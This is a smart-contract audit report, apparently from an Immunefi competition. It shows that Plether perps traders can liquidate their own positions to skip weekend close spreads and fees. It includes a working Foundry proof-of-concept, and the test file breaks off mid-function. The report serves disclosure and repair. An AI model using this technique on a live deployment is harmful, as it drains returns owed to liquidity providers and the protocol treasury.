# \#97649 [SC-Medium] Missing keeper != account check plus under-priced liquidation lets a trader liquidate their own position as a fee-free exit, bypassing the 50 bps frozen-close spread, the 4 bps execution fee and close VPI every weekend

**Submitted on Nov 2nd 2026 at 15:24:33 UTC by @Magnum for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97649
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

Liquidation is permissionless and nothing in `OrderRouter`, `CfdEngine` or `MarginClearinghouse` forbids `keeper == account`. The liquidation planner charges only the 10 bps liquidation charge (half of which is credited back to the keeper, i.e. to the trader themselves) plus unpaid carry and VPI clawback; it never assesses the costs that make a voluntary close expensive: the 4 bps execution fee, the 50 bps frozen-close spread and the skew-increasing close VPI. With the deployed risk parameters (`fadMarginBps = 300` vs `initMarginBps = 20`) every leveraged position below 3% margin becomes liquidatable with no price move the moment the FAD window opens on Friday 16:30 NY and stays liquidatable through the whole frozen weekend. A trader therefore exits by calling `executeLiquidation` on their own account at the stale Friday mark plus a 2 bps adverse shift, paying ~7 bps instead of ~54 bps. On a $100k position this is +$470 for the trader, −$430 for the LP pool and −$40 for the treasury, deterministically every weekend; in the live market the same trick skips close VPI and the fee whenever the book is skewed against the trader's close.

## Vulnerability Details

**No self-liquidation check anywhere on the path.**

`router/OrderLiquidationBatchLogic.sol:706-732` (`executeLiquidation`) forwards `msg.sender` as the keeper:

```solidity
function executeLiquidation(address account, bytes[] calldata pythUpdateData) external payable {
    ...
    IPletherOracle.PriceSnapshot memory snapshot =
        oracle.updateLiquidationPrice{value: pythFee}(msg.sender, pythUpdateData, account);
    ...
    host.executeLiquidationBatchItem(
        account, snapshot.price, snapshot.price, snapshot.markPrice, snapshot.publishTime, msg.sender, riskOffCutoff
    );
}
```

`router/OrderLiquidationHandler.sol:25-68` passes `keeper` straight to `engine.liquidatePosition(account, …, keeper)`. `CfdEngine._applyLiquidation` (`CfdEngine.sol:1324-1349`) uses `keeper != delta.account` only to *skip* the keeper carry checkpoint, i.e. self-liquidation is explicitly tolerated:

```solidity
bool syncKeeper = delta.keeperBountyAssets > 0 && keeper != delta.account && _positions[keeper].lots > 0;
...
if (delta.keeperBountyAssets > 0 && keeper != delta.account) {
    _checkpointBountyRecipient(keeper, delta.price, publishTime);
}
```

`MarginClearinghouse._applyLiquidationSettlementPlan` (`MarginClearinghouse.sol:1264-1270`) credits the keeper share as an internal balance move to any keeper, including the liquidated account:

```solidity
if (execution.keeperBountyAssets > 0) {
    if (execution.keeper == address(0)) revert MarginClearinghouse__ZeroAddress();
    settlementBalances[execution.keeper] += execution.keeperBountyAssets;
    emit ReservedSettlementTransferred(account, execution.keeper, execution.keeperBountyAssets);
}
```

**Liquidation is cheaper than a voluntary close.** `libraries/CfdEnginePlanLib.sol:1554-1571` (`_planLiquidationActionSettlement`) assesses only unpaid carry and the negative-VPI clawback:

```solidity
uint256 vpiClawbackAssets = _negativeVpiReserveTarget(pos.vpiAccrued);
...
delta.actionChargeAssessedAssets = delta.pendingCarryAssets - delta.realizedCarryAssets + vpiClawbackAssets;
```

The execution fee, the frozen-close spread and the skew-increasing close VPI exist only in the voluntary close path, `libraries/CloseAccountingLib.sol:118-126`:

```solidity
state.executionFeeAssets = (notionalAssets * inputs.executionFeeBps) / 10_000;
if (inputs.oracleFrozen) {
    state.frozenSpreadAssets = (notionalAssets * inputs.frozenCloseSpreadBps) / 10_000;
}
state.netSettlementAssets = state.realizedPnlAssets - state.vpiDeltaAssets
    - int256(state.executionFeeAssets + state.frozenSpreadAssets);
```

The only liquidation-specific costs are the 10 bps liquidation charge (`bountyBps = 10`, half returned to the keeper via `keeperShareBps = 5000`, `protocolShareBps = 0`) and, in frozen mode, a deterministic adverse shift of `basketMaxConfidenceRatioBps × adverseConfidenceMultiplierBps` = 10 bps × 20–25% ≈ 2–2.5 bps on the cached Friday mark (`PletherOracle.sol:729-744`, `_frozenBasket`).

**The precondition is scheduled, not price-driven.** Deployed risk parameters (`script/DeployPerpsArbitrumSepolia.s.sol:436-445`, enforced by `VerifyPerpsArbitrumSepolia.s.sol:410-418`): `maintMarginBps = 10`, `initMarginBps = 20`, `fadMarginBps = 300`. `planLiquidation` (`CfdEnginePlanLib.sol:1424-1470`, eligibility at L1450) switches to `fadMarginBps` inside the FAD window (`MarketCalendarLib`: Friday 16:30 NY to Sunday 17:15 NY; oracle frozen Friday 17:00 NY to Sunday 17:00 NY). Any position opened with less than 3% margin, i.e. anything above ~33x and in practice every leveraged position since the initial requirement is 0.2%, is liquidatable every weekend without a single price tick. The trader controls the precondition entirely by choosing their margin.

**Relation to documented behaviour.** `SECURITY.md` Known Limitations document the frozen-close spread as the LP-owned compensation for stale-price (weekend gap) exits: "oracle-frozen voluntary close/reduce execution applies normal signed VPI plus a fixed LP-owned notional spread". Self-liquidation is a second exit lane during the same window that pays neither the spread nor the VPI, which defeats that mitigation. No prior report or known-issue entry covers self-liquidation or the liquidation/close cost inversion.

## Impact Details

Numbers from the PoC (6-decimal USDG, $100,000 LONG with 2% margin, deployed risk parameters, $1,002,000 Junior liquidity):

**Frozen weekend (Saturday 12:00 UTC):**

| | Self-liquidation (trader is keeper) | Voluntary close |
|---|---|---|
| execution price | 1.0002 (Friday mark + 2 bps) | 1.0000 (Friday mark) |
| trader cost of exit | **73.95 USDG** | 543.95 USDG |
| keeper share credited back to trader | 50.00 | – |
| frozen spread (50 bps) | **0** | 500.00 |
| execution fee (4 bps) to treasury | **0** | 40.00 |
| pool `totalAssets` delta | +73.95 | +503.95 |

Trader +470.00 (47 bps of notional), LP pool −430.00, treasury −40.00. Self-liquidation costs 7.4 bps instead of 54.4 bps.

**Live market, book skewed 20% against the trader's close (`vpiFactor = 0.01e18`), 1.76% adverse tick:**

| | Self-liquidation | Voluntary close |
|---|---|---|
| trader cost of exit | **1,810.15** | 2,059.17 |
| close VPI charge | **0** | 258.31 |
| execution fee | **0** | 40.70 |
| keeper share back to trader | 50.00 | – |

Trader +249.01, pool −208.31, treasury −40.70.

**FAD window with live oracle (Friday 16:35 NY):** the 2%-margin position is liquidatable with the price unchanged; the trader liquidates themselves, the keeper share lands on their own account and the treasury receives nothing. This proves the scheduled precondition and that the trader can always pre-empt the weekly FAD liquidation race against themselves.

Consequences:
- **LP yield loss.** The 50 bps frozen spread is the only compensation LPs receive for the weekend stale-price option. Every leveraged trader can exit the whole weekend without paying it, so LPs underwrite the gap risk for ~2 bps instead of ~50 bps. This is systematic, every weekend, for every position below 3% margin.
- **Protocol fee avoidance.** The 4 bps execution fee is never charged on a liquidation; the treasury receives nothing from a self-liquidation.
- **VPI avoidance.** The skew-increasing close VPI (up to ~40 bps at the 40% skew cap) is never assessed in a liquidation, so in a skewed book the trader exits cheaper than the designed close price, and the skew-reducing counterparties are not compensated.
- The attacker does not touch other users' balances, so the selected impact is **Contract fails to deliver promised returns, but doesn't lose value** (LPs and treasury do not receive the returns the protocol promises for the risk they carry). The leakage is deterministic, repeatable weekly and scales linearly with open interest.

**Recommended fix**
1. Reject `keeper == account` in `OrderLiquidationHandler.executeLiquidationBatchItem` (or in the engine), or route the keeper share to LPs / treasury when `keeper == account`. Alone this is insufficient (a second address gives the same economics minus gas), so also:
2. Make a liquidation at least as expensive as a voluntary close: assess `executionFeeAssets`, `frozenSpreadAssets` while `oracleFrozen`, and the skew-increasing `vpiDelta` inside `planLiquidation` / `_planLiquidationActionSettlement`, collected from seized settlement before any residual is returned; or require `liquidationCharge >= executionFee + frozenSpread + max(vpiDelta, 0)` when eligibility comes only from the FAD threshold (`equity > maintMargin` at `maintMarginBps`).
3. Reconsider `fadMarginBps = 300` vs `initMarginBps = 20`: a 15x jump makes every open position liquidatable on a schedule, creating both this deterministic exit and a weekly mass-liquidation race. Apply the FAD threshold to new Friday opens, or to existing positions only after a grace period, or set it no higher than the initial margin.

## References

- `packages/perps/src/router/OrderLiquidationBatchLogic.sol` L706-732 (`executeLiquidation`, `msg.sender` as keeper, no self check), L738+ (`executeLiquidationBatch`)
- `packages/perps/src/router/OrderLiquidationHandler.sol` L25-68 (`executeLiquidationBatchItem`, L62 forwards keeper)
- `packages/perps/src/CfdEngine.sol` L1324-1349 (`_applyLiquidation`, L1331/L1336 self-keeper tolerated)
- `packages/perps/src/MarginClearinghouse.sol` L1264-1270 (`_applyLiquidationSettlementPlan`, keeper share credit)
- `packages/perps/src/libraries/CfdEnginePlanLib.sol` L1424-1470 (`planLiquidation`, FAD eligibility L1450), L1554-1571 (`_planLiquidationActionSettlement`)
- `packages/perps/src/libraries/CloseAccountingLib.sol` L118-126 (fee and frozen spread only on voluntary close)
- `packages/perps/src/PletherOracle.sol` L729-744 (`_frozenBasket`, 2 bps adverse shift)
- `packages/perps/src/libraries/MarketCalendarLib.sol` (FAD and frozen windows)
- `script/DeployPerpsArbitrumSepolia.s.sol` L436-445, `script/VerifyPerpsArbitrumSepolia.s.sol` L410-418 (deployed risk parameters)
- `packages/perps/SECURITY.md` Known Limitations, "oracle-frozen voluntary close/reduce execution applies normal signed VPI plus a fixed LP-owned notional spread"

## Proof of Concept

## Proof of Concept

Foundry test against competition commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, on the repository's `BasePerpTest` fixture with the deployed Arbitrum Sepolia risk parameters (`maintMarginBps 10`, `initMarginBps 20`, `fadMarginBps 300`, `bountyBps 10`, `keeperShareBps 5000`, `protocolShareBps 0`), production `OrderRouter → CfdEngine → MarginClearinghouse → HousePool → PletherOracle` path and the repo's `MockPyth` helpers. Each test takes a `vm.snapshotState()` and exits the identical position twice: once via `router.executeLiquidation(trader, …)` called by the trader themselves, once via the ordinary router close (`commitOrder` + `executeOrder`), then compares trader balance, pool `totalAssets` and treasury credit.

### Steps

1. Save the file below as `packages/perps/test/perps/PoC_SelfLiquidation.t.sol`.
2. Run:

```bash
FOUNDRY_PROFILE=quick forge test --root packages/perps --match-path "test/perps/PoC_SelfLiquidation.t.sol" -vvv
```

3. Observe:
   - `test_PoC_FadWindow_TraderCanSelfLiquidate_KeeperShareReturnsToTrader` (Friday 16:35 NY, FAD open, oracle live): on Wednesday `executeLiquidation(TRADER)` reverts `CfdEngine__PositionIsSolvent`; in the FAD window the 2%-margin position is liquidatable with the price unchanged at 1.0000; the trader liquidates themselves; `ReservedSettlementTransferred(account, keeper, 50 USDG)` shows `keeper == account`; the trader ends with `settlementRetainedAssets + keeperBountyAssets` and withdraws everything; treasury credit is 0 while a voluntary close pays the 4 bps fee.
   - `test_PoC_FrozenWeekend_SelfLiquidationBeatsVoluntaryClose` (Saturday noon, frozen oracle): self-liquidation executes at the Friday mark + 2 bps with empty Pyth data and costs 73.95 USDG; the voluntary close costs 543.95 USDG (500 frozen spread + 40 fee + carry). Asserts: trader strictly better off, pool strictly worse off, treasury not better off, self-liquidation cost < 1/5 of the close, treasury receives nothing.
   - `test_PoC_LiveMarket_SelfLiquidationSkipsCloseVpiAndFee` (`vpiFactor = 0.01e18`, book skewed by a 3x SHORT): a 1.76% adverse tick makes the LONG liquidatable; self-liquidation costs 1,810.15 vs 2,059.17 for the close (close VPI 258.31 + fee 40.70 skipped, 50 keeper share recovered).

### Result

```
Ran 2 tests for test/perps/PoC_SelfLiquidation.t.sol:PoC_SelfLiquidation_FadAndFrozenTest
[PASS] test_PoC_FadWindow_TraderCanSelfLiquidate_KeeperShareReturnsToTrader() (gas: 5405368)
[PASS] test_PoC_FrozenWeekend_SelfLiquidationBeatsVoluntaryClose() (gas: 5013676)
Logs:
    trader advantage of self-liquidation (6 dec, signed): 470000000
    pool shortfall vs voluntary close (6 dec, signed): 430000000
    treasury shortfall vs voluntary close (6 dec, signed): 40000000
Suite result: ok. 2 passed; 0 failed; 0 skipped

Ran 1 test for test/perps/PoC_SelfLiquidation.t.sol:PoC_SelfLiquidation_LiveSkewedBookTest
[PASS] test_PoC_LiveMarket_SelfLiquidationSkipsCloseVpiAndFee() (gas: 7113086)
Logs:
    liquidation charge (preview): 100000000
    trader advantage of self-liquidation (6 dec, signed): 249013786
    pool shortfall vs voluntary close (6 dec, signed): 208309747
    treasury shortfall vs voluntary close (6 dec, signed): 40704039
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Detailed `-vvv` console output for the frozen weekend test:

```
---- Frozen weekend: self-liquidation ----
  execution price (8 dec):            100020000
  trader USDG before (6 dec):         9959800000
  trader USDG after  (6 dec):         9885851561
  trader cost of exit (6 dec):        73948439
  keeper bounty credited to trader:   50000000
  pool totalAssets delta (6 dec):     73948439
  treasury credit delta (6 dec):      0
---- Frozen weekend: voluntary close ----
  execution price (8 dec):            100000000
  trader USDG before (6 dec):         9959800000
  trader USDG after  (6 dec):         9415851561
  trader cost of exit (6 dec):        543948439
  keeper bounty credited to trader:   0
  pool totalAssets delta (6 dec):     503948439
  treasury credit delta (6 dec):      40000000
  voluntary close execution fee (preview):      40000000
  voluntary close frozen spread (preview):      500000000
```

### Test file

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// PoC: a trader can liquidate their OWN position (keeper == account is never forbidden) and thereby exit
// without paying the execution fee, the close VPI and the frozen-close spread, while receiving the keeper
// half of the liquidation charge back on the same account.
//
// Run: FOUNDRY_PROFILE=quick forge test --root packages/perps \
//        --match-path "test/perps/PoC_SelfLiquidation.t.sol" -vvv

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {Vm} from "forge-std/Vm.sol";
import {console} from "forge-std/console.sol";

abstract contract PoC_SelfLiquidationBase is BasePerpTest {

    struct Outcome {
        uint256 traderClearinghouseAfter; // trader settlement balance once flat (all buckets released)
        uint256 traderWithdrawn; // tokens actually withdrawn to the trader wallet afterwards
        uint256 poolAssets; // pool.totalAssets() after the exit
        uint256 treasury; // protocol treasury clearinghouse credit after the exit
        uint256 executionPrice;
        uint256 keeperBounty; // only for the liquidation path
    }

    address internal constant TRADER = address(0x5E1F);
    address internal constant SHORT_LP = address(0x5807);

    /// @dev Wednesday 2024-10-16 12:00 UTC (live market).
    uint256 internal constant WEDNESDAY_NOON = 1_729_080_000;
    /// @dev Friday 2024-10-18 20:30 UTC == 16:30 New York (EDT): FAD window opens, oracle still live.
    uint256 internal constant FRIDAY_FAD_START = 1_729_283_400;
    /// @dev Friday 21:00 UTC: oracle frozen for the weekend.
    uint256 internal constant FRIDAY_FREEZE_START = FRIDAY_FAD_START + 30 minutes;
    /// @dev Saturday 2024-10-19 12:00 UTC: FAD + frozen oracle.
    uint256 internal constant SATURDAY_NOON = FRIDAY_FAD_START + 15 hours + 30 minutes;

    uint256 internal constant SIZE = 100_000e18; // 1000 lots == $100k notional at $1.00
    uint256 internal constant MARGIN = 2_000e6; // 2% margin: 10x the 0.2% initial margin, < 3% FAD margin

    bytes32 internal constant POSITION_LIQUIDATED_TOPIC =
        keccak256("PositionLiquidated(address,uint8,uint256,uint256,uint256)");
    bytes32 internal constant RESERVED_SETTLEMENT_TRANSFERRED_TOPIC =
        keccak256("ReservedSettlementTransferred(address,address,uint256)");

    function _vpiFactor() internal pure virtual returns (uint256) {
        return 0;
    }

    /// @dev Deployed Arbitrum Sepolia parameters (script/DeployPerpsArbitrumSepolia.s.sol).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: _vpiFactor(),
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public virtual override {
        super.setUp();
        vm.warp(WEDNESDAY_NOON);
        _fundTrader(TRADER, 10_000e6);
        vm.deal(TRADER, 1 ether);
    }

    // --- flow helpers (router entry points, exactly as a user / keeper would call them) ---

    function _openViaRouter(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, margin, 0, false); // 0 == permissive price bound
        router.executeOrder(orderId, _mockPythUpdateData());
        assertEq(_positionSize(account), size, "open must fill");
    }

    function _refreshMark() internal {
        router.updateMarkPrice(_mockPythUpdateData());
    }

    function _positionSize(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    /// @dev Frozen oracle: empty blob replays the cached mark. Live oracle: fresh mock tick at `price`.
    ///      Must be built AFTER a router commit so the unique tick lands strictly after `commitTime`.
    function _updateDataFor(
        uint256 price
    ) internal returns (bytes[] memory data) {
        if (engine.isOracleFrozen()) {
            data = new bytes[](1);
            data[0] = "";
        } else {
            data = _mockPythUpdateData(price);
        }
    }

    /// @dev Path A: the trader calls the public liquidation entry point on their own account.
    function _selfLiquidate(
        address account,
        uint256 price
    ) internal returns (Outcome memory out) {
        bytes[] memory updateData = _updateDataFor(price);
        vm.recordLogs();
        vm.prank(account);
        router.executeLiquidation(account, updateData);
        Vm.Log[] memory logs = vm.getRecordedLogs();

        bool foundLiq;
        bool foundKeeperCredit;
        address creditedKeeper;
        uint256 creditedAmount;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == address(engine) && logs[i].topics[0] == POSITION_LIQUIDATED_TOPIC) {
                assertEq(address(uint160(uint256(logs[i].topics[1]))), account, "liquidated account");
                (, , uint256 execPrice, uint256 bounty) =
                    abi.decode(logs[i].data, (uint8, uint256, uint256, uint256));
                out.executionPrice = execPrice;
                out.keeperBounty = bounty;
                foundLiq = true;
            }
            if (
                logs[i].emitter == address(clearinghouse) && logs[i].topics[0] == RESERVED_SETTLEMENT_TRANSFERRED_TOPIC
                    && address(uint160(uint256(logs[i].topics[1]))) == account
            ) {
                creditedKeeper = address(uint160(uint256(logs[i].topics[2])));
                creditedAmount = abi.decode(logs[i].data, (uint256));
                foundKeeperCredit = true;
            }
        }
        assertTrue(foundLiq, "PositionLiquidated must be emitted");
        assertTrue(foundKeeperCredit, "keeper bounty credit must be emitted");
        // The keeper share is credited back to the liquidated trader's own clearinghouse account.
        assertEq(creditedKeeper, account, "keeper bounty must be credited to the trader itself");
        assertEq(creditedAmount, out.keeperBounty, "keeper bounty amount must match event");
        assertGt(out.keeperBounty, 0, "self-liquidation must pay a bounty");

        _finishExit(account, out);
    }

    /// @dev Path B: ordinary voluntary full close through the router (commit + keeper execution).
    function _voluntaryClose(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 price
    ) internal returns (Outcome memory out) {
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, 0, 0, true);
        router.executeOrder(orderId, _updateDataFor(price));
        out.executionPrice = engine.lastMarkPrice();
        _finishExit(account, out);
    }

    function _finishExit(
        address account,
        Outcome memory out
    ) internal {
        assertEq(_positionSize(account), 0, "position must be flat after the exit");
        assertEq(engine.traderClaimBalanceAssets(account), 0, "no deferred claim expected in this PoC");
        out.traderClearinghouseAfter = clearinghouse.balanceAssets(account);
        assertEq(
            clearinghouse.lockedMarginAssets(account), 0, "flat account must have every bucket released"
        );
        out.poolAssets = pool.totalAssets();
        out.treasury = clearinghouse.balanceAssets(engine.protocolTreasury());

        // Prove the money is really extractable: withdraw everything to the wallet.
        uint256 walletBefore = settlementToken.balanceOf(account);
        vm.prank(account);
        clearinghouse.withdraw(account, out.traderClearinghouseAfter);
        out.traderWithdrawn = settlementToken.balanceOf(account) - walletBefore;
        assertEq(out.traderWithdrawn, out.traderClearinghouseAfter, "full withdrawal must succeed");
    }

    function _logOutcome(
        string memory label,
        Outcome memory out,
        uint256 traderBefore,
        uint256 poolBefore,
        uint256 treasuryBefore
    ) internal pure {
        console.log("---- %s ----", label);
        console.log("  execution price (8 dec):            %s", out.executionPrice);
        console.log("  trader USDG before (6 dec):         %s", traderBefore);
        console.log("  trader USDG after  (6 dec):         %s", out.traderClearinghouseAfter);
        console.log("  trader cost of exit (6 dec):        %s", traderBefore - out.traderClearinghouseAfter);
        console.log("  keeper bounty credited to trader:   %s", out.keeperBounty);
        console.log("  pool totalAssets delta (6 dec):     %s", out.poolAssets - poolBefore);
        console.log("  treasury credit delta (6 dec):      %s", out.treasury - treasuryBefore);
    }

    function _compare(
        Outcome memory selfLiq,
        Outcome memory close
    ) internal pure {
        console.log("==== self-liquidation vs voluntary close ====");
        console.log(
            "  trader advantage of self-liquidation (6 dec, signed):",
            int256(selfLiq.traderClearinghouseAfter) - int256(close.traderClearinghouseAfter)
        );
        console.log("  pool shortfall vs voluntary close (6 dec, signed):", int256(close.poolAssets) - int256(selfLiq.poolAssets));
        console.log("  treasury shortfall vs voluntary close (6 dec, signed):", int256(close.treasury) - int256(selfLiq.treasury));
        assertGt(
            selfLiq.traderClearinghouseAfter,
            close.traderClearinghouseAfter,
            "self-liquidation must leave the trader strictly better off than a voluntary close"
        );
        assertLt(selfLiq.poolAssets, close.poolAssets, "pool must be strictly worse off under self-liquidation");
        assertLe(selfLiq.treasury, close.treasury, "treasury must not be better off under self-liquidation");
    }

}

/// @notice Deployed parameters with vpiFactor = 0: isolates execution fee + frozen spread avoidance.
contract PoC_SelfLiquidation_FadAndFrozenTest is PoC_SelfLiquidationBase {

    /// @dev FAD window (Friday 16:30 NY, oracle still live): a 2%-margin position is liquidatable with no
    ///      price move at all. The trader liquidates themselves and receives the keeper half on their own account.
    function test_PoC_FadWindow_TraderCanSelfLiquidate_KeeperShareReturnsToTrader() public {
        _openViaRouter(TRADER, CfdTypes.Side.LONG, SIZE, MARGIN);

        // Nobody can liquidate on Wednesday: equity (~2%) >> 0.1% maintenance.
        bytes[] memory solventData = _mockPythUpdateData();
        vm.prank(TRADER);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__PositionIsSolvent.selector);
        router.executeLiquidation(TRADER, solventData);

        vm.warp(FRIDAY_FAD_START + 5 minutes);
        assertTrue(engine.isFadWindow(), "FAD window must be open");
        assertFalse(engine.isOracleFrozen(), "oracle must still be live");

        uint256 traderBefore = clearinghouse.balanceAssets(TRADER);
        uint256 poolBefore = pool.totalAssets();
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());

        ICfdEngineTypes.LiquidationPreview memory preview = engineLens.previewLiquidation(TRADER, 1e8);
        assertTrue(preview.liquidatable, "2% margin must be liquidatable at 3% FAD margin without any price move");
        ICfdEngineTypes.ClosePreview memory closePreview = engineLens.previewClose(TRADER, SIZE, 1e8);

        uint256 snap = vm.snapshotState();
        Outcome memory selfLiq = _selfLiquidate(TRADER, 1e8);
        _logOutcome("FAD live window: self-liquidation", selfLiq, traderBefore, poolBefore, treasuryBefore);
        assertEq(selfLiq.keeperBounty, preview.keeperBountyAssets, "keeper share must match preview");
        assertEq(selfLiq.keeperBounty, 50e6, "keeper share == 5 bps of $100k");
        assertEq(preview.liquidationChargeAssets, 100e6, "total liquidation charge == 10 bps of $100k");
        // trader keeps settlementRetained (net of the full charge) PLUS the keeper half credited to themselves
        assertApproxEqAbs(
            selfLiq.traderClearinghouseAfter,
            preview.settlementRetainedAssets + preview.keeperBountyAssets,
            20,
            "trader must end with retained settlement + own keeper bounty"
        );

        vm.revertToState(snap);
        Outcome memory close = _voluntaryClose(TRADER, CfdTypes.Side.LONG, SIZE, 1e8);
        _logOutcome("FAD live window: voluntary close", close, traderBefore, poolBefore, treasuryBefore);
        console.log("  voluntary close execution fee (preview):      %s", closePreview.executionFeeAssets);
        console.log("  voluntary close frozen spread (preview):      %s", closePreview.frozenSpreadAssets);
        // Live window: the only avoided cost is the 4 bps execution fee against a 5 bps net liquidation charge,
        // so no strict dominance is asserted here; the treasury still loses its fee under self-liquidation.
        assertEq(selfLiq.treasury, treasuryBefore, "self-liquidation pays no protocol fee");
        assertEq(close.treasury - treasuryBefore, closePreview.executionFeeAssets, "voluntary close pays the fee");
    }

    /// @dev Frozen weekend oracle: voluntary close pays 50 bps frozen spread + 4 bps fee; self-liquidation pays a
    ///      10 bps charge of which 5 bps come straight back, plus a 2 bps deterministic adverse shift.
    function test_PoC_FrozenWeekend_SelfLiquidationBeatsVoluntaryClose() public {
        _openViaRouter(TRADER, CfdTypes.Side.LONG, SIZE, MARGIN);

        // Friday 20:58 UTC: the last live mark before the weekend freeze (keepers refresh the mark normally).
        vm.warp(FRIDAY_FREEZE_START - 2 minutes);
        _refreshMark();
        uint256 frozenMark = engine.lastMarkPrice();
        assertEq(frozenMark, 1e8, "mark must be the neutral $1.00 basket");

        vm.warp(SATURDAY_NOON);
        assertTrue(engine.isFadWindow(), "weekend is FAD");
        assertTrue(engine.isOracleFrozen(), "weekend is oracle-frozen");

        uint256 traderBefore = clearinghouse.balanceAssets(TRADER);
        uint256 poolBefore = pool.totalAssets();
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());

        // Deterministic frozen liquidation price: mark shifted adversely by basketMaxConfidenceRatio * adverseMultiplier.
        uint256 confidence = frozenMark * pletherOracle.basketMaxConfidenceRatioBps() / 10_000;
        uint256 expectedLiqPrice = frozenMark + confidence * pletherOracle.adverseConfidenceMultiplierBps() / 10_000;
        ICfdEngineTypes.LiquidationPreview memory liqPreview = engineLens.previewLiquidation(TRADER, expectedLiqPrice);
        assertTrue(liqPreview.liquidatable, "2% margin is liquidatable at 3% FAD margin");
        ICfdEngineTypes.ClosePreview memory closePreview = engineLens.previewClose(TRADER, SIZE, frozenMark);
        assertTrue(closePreview.valid, "frozen close must be previewable");
        assertEq(closePreview.frozenSpreadAssets, SIZE * frozenMark / 1e20 * FROZEN_CLOSE_SPREAD_BPS / 10_000);

        uint256 snap = vm.snapshotState();

        // ---- Path A: trader liquidates themselves with empty Pyth data (frozen replay of the Friday mark) ----
        Outcome memory selfLiq = _selfLiquidate(TRADER, frozenMark);
        _logOutcome("Frozen weekend: self-liquidation", selfLiq, traderBefore, poolBefore, treasuryBefore);
        assertEq(selfLiq.executionPrice, expectedLiqPrice, "frozen liquidation price == mark + 2 bps");
        assertEq(selfLiq.keeperBounty, liqPreview.keeperBountyAssets, "keeper bounty must match preview");
        assertApproxEqAbs(
            selfLiq.traderClearinghouseAfter,
            liqPreview.settlementRetainedAssets + liqPreview.keeperBountyAssets,
            20,
            "trader ends with retained settlement + own keeper bounty"
        );

        // ---- Path B: same state, trader closes voluntarily during the freeze ----
        vm.revertToState(snap);
        Outcome memory close = _voluntaryClose(TRADER, CfdTypes.Side.LONG, SIZE, frozenMark);
        _logOutcome("Frozen weekend: voluntary close", close, traderBefore, poolBefore, treasuryBefore);
        console.log("  voluntary close execution fee (preview):      %s", closePreview.executionFeeAssets);
        console.log("  voluntary close frozen spread (preview):      %s", closePreview.frozenSpreadAssets);
        assertEq(close.executionPrice, frozenMark, "frozen voluntary close replays the neutral mark");
        assertEq(close.treasury - treasuryBefore, closePreview.executionFeeAssets, "treasury collects the 4 bps fee");

        _compare(selfLiq, close);

        // Headline numbers: the self-liquidator avoids the whole 50 bps frozen spread and the 4 bps fee.
        uint256 selfLiqCost = traderBefore - selfLiq.traderClearinghouseAfter;
        uint256 closeCost = traderBefore - close.traderClearinghouseAfter;
        assertLt(selfLiqCost, closeCost / 5, "self-liquidation must cost less than a fifth of the voluntary close");
        assertEq(selfLiq.treasury, treasuryBefore, "protocol treasury receives nothing from a self-liquidation");
    }

}

/// @notice Deployed vpiFactor (0.01e18) with a skewed book: the live (non-FAD) path. A tiny adverse move makes a
///         near-initial-margin position liquidatable; self-liquidation then skips the close VPI and the fee.
contract PoC_SelfLiquidation_LiveSkewedBookTest is PoC_SelfLiquidationBase {

    function _vpiFactor() internal pure override returns (uint256) {
        return 0.01e18;
    }

    function setUp() public override {
        super.setUp();
        _fundTrader(SHORT_LP, 50_000e6);
    }

    function test_PoC_LiveMarket_SelfLiquidationSkipsCloseVpiAndFee() public {
        // Trader LONG first (skew-increasing open, pays VPI), then a large SHORT makes the LONG skew-reducing,
        // so the LONG's close is skew-increasing and would be charged VPI.
        _openViaRouter(TRADER, CfdTypes.Side.LONG, SIZE, MARGIN);
        _openViaRouter(SHORT_LP, CfdTypes.Side.SHORT, 3 * SIZE, 9_000e6);
        _warpForward(1 hours);

        // Pick an adverse price that leaves ~$50 of pledge equity: below the 0.1% maintenance (~$100), no bad debt.
        uint256 pledge = clearinghouse.pnlPledgeAssets(TRADER);
        uint256 lossTarget = pledge - 50e6;
        uint256 adversePrice = 1e8 + lossTarget / 1000; // $100k notional: 1e-8 price unit == $0.001
        ICfdEngineTypes.LiquidationPreview memory liqPreview = engineLens.previewLiquidation(TRADER, adversePrice);
        assertTrue(liqPreview.liquidatable, "position must be liquidatable after the small adverse move");
        assertGt(liqPreview.seizedCollateralAssets, 0, "pledge must be seized for the price loss");
        ICfdEngineTypes.ClosePreview memory closePreview = engineLens.previewClose(TRADER, SIZE, adversePrice);
        assertGt(closePreview.vpiDeltaAssets, 0, "skew-increasing close must be charged VPI");

        uint256 traderBefore = clearinghouse.balanceAssets(TRADER);
        uint256 poolBefore = pool.totalAssets();
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());
        console.log("live path: pledge %s, adverse price %s", pledge, adversePrice);
        console.log("  close VPI charge (preview):   %s", uint256(closePreview.vpiDeltaAssets));
        console.log("  close execution fee (preview):%s", closePreview.executionFeeAssets);
        console.log("  liquidation charge (preview): %s", liqPreview.liquidationChargeAssets);
        console.log("  keeper bounty (preview):      %s", liqPreview.keeperBountyAssets);

        uint256 snap = vm.snapshotState();
